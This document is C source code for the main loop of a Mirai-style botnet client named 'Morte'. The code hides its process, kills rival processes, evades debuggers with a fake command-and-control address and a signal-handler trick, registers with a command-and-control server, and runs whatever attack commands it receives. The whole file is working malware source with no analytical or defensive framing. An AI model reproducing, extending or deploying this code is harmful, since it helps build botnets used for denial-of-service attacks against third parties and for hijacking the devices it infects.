#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/attack.h"
#include "headers/resolv.h"
#include "headers/locker.h"
#include "headers/killer.h"
#include "headers/util.h"

#ifndef DEBUG
#include "headers/daemon.h"
#endif

#ifndef Morte_arch
#define Morte_arch "???"
#endif

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0, main_pid = 0, cnc_port = 0;

int disable_counter = 0;
int retry_count = 0;
int reconnect_delay = 5;

BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;
char bot_id[32] = {0};

int version_len = 0;
char *version_val;

int arch_len = 0;
char *arch_val;

int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, anti_gdb_entry);
#endif

#ifdef DEBUG
    printf("Morte debug mode\n");
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);
    rand_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_strcpy(bot_id, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

#ifndef DEBUG
    daemonize(argc, args);
#endif

    main_pid = getpid();
    attack_init();
    killer_main();
    watcher_init();

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 4 == 0)
            {
                if (send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL) == -1)
                {
#ifdef DEBUG
                    printf("[Morte_main] Ping failed, tearing down connection (errno = %d)\n", errno);
#endif
                    if (fd_serv != -1)
                        teardown_connection();
                    continue;
                }
            }
        }

        if (++disable_counter % 30 == 0)
        {
            disable_commands();
#ifdef DEBUG
            printf("[Morte_main] Refreshed disabled command protection.\n");
#endif
        }

        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof(cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[Morte_main] Detected newer instance running! Killing self\n");
#endif

            kill(pgid * -1, 9);
            if (watchdog_pid != 0)
                kill(watchdog_pid, 9);
            exit(0);
        }

        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[Morte_main] timed out while connecting to CNC\n");
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[Morte_main] error while connecting to CNC code=%d\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    close(fd_serv);
                    fd_serv = -1;

                    reconnect_delay *= 2;
                    if (reconnect_delay > 60)
                        reconnect_delay = 60;

                    sleep(reconnect_delay);
                }
                else
                {
                    table_unlock_val(TABLE_VERSION);
                    version_val = table_retrieve_val(TABLE_VERSION, &version_len);

                    arch_val = Morte_arch;
                    arch_len = util_strlen(Morte_arch);

                    uint8_t id_len = util_strlen(id_buf);
                    LOCAL_ADDR = util_local_addr();

                    // Sent bytes
                    send(fd_serv, "\x00\x00\x00\x00", 4, MSG_NOSIGNAL);

                    // Sent verion
                    uint8_t len_8_version = (uint8_t)version_len;
                    send(fd_serv, &len_8_version, sizeof(len_8_version), MSG_NOSIGNAL);
                    send(fd_serv, version_val, version_len, MSG_NOSIGNAL);
                    
                    // Sent arch
                    uint8_t len_8_arch = (uint8_t)arch_len;
                    send(fd_serv, &len_8_arch, sizeof(len_8_arch), MSG_NOSIGNAL);
                    send(fd_serv, arch_val, arch_len, MSG_NOSIGNAL);

                    table_lock_val(TABLE_VERSION);
                    // Sent Source
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf("[Morte_main] connected to CNC.\n");
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_DONTWAIT);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }


            if (n == 0)
            {
#ifdef DEBUG
                printf("[Morte_main] lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();
                continue;
            }

            if (len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if (len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_DONTWAIT);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
#ifdef DEBUG
                printf("[Morte_main] lost connection with CNC (errno = %d) 2\n", errno);
#endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_DONTWAIT);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_DONTWAIT);

#ifdef DEBUG
            printf("[Morte_main] received %d bytes from CNC\n", len);
#endif

            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries = resolv_lookup_multi();

    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[Morte_main] Failed to resolve any CNC address\n");
#endif
        return;
    }

    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    cnc_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf("[Morte_main] Resolved domain\n");
#endif
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf("[Morte_main] attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[Morte_main] failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    struct timeval timeout = {10, 0};
    setsockopt(fd_serv, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
    setsockopt(fd_serv, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf("[Morte_main] tearing down connection to CNC!\n");
#endif

    if (fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
}
